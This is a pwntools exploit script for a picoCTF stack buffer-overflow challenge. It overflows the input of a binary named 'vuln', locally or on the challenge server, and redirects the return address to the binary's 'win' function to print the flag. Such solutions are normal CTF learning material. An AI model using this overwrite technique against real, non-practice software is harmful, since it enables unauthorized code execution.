from pwn import *



def get_process(elf):
	if args.REMOTE:
		# saturn.picoctf.net 60225
		url = 'saturn.picoctf.net'
		port =  60225
		p = remote(url, port)
	else:
		context.log_level = 'debug'
		p = elf.process()
	return p

def go_to_vuln(p):
	p.recvuntil(b"string: \n")

def payload(elf):
	win = elf.symbols['win']  # Function that call picoCTF{...}

	rop = ROP(elf)
	rop.raw("A" * (cyclic_find(p32(0x6161616c))))
	rop.raw(win)
	rop = rop.chain()
	return rop




elf_path = 'vuln'
elf = ELF(elf_path)



p = get_process(elf)
go_to_vuln(p)
p.sendline(payload(elf))
res1 = p.recvall(2)

log.success(f"FLAG ==> {res1.splitlines()[1].decode()}")
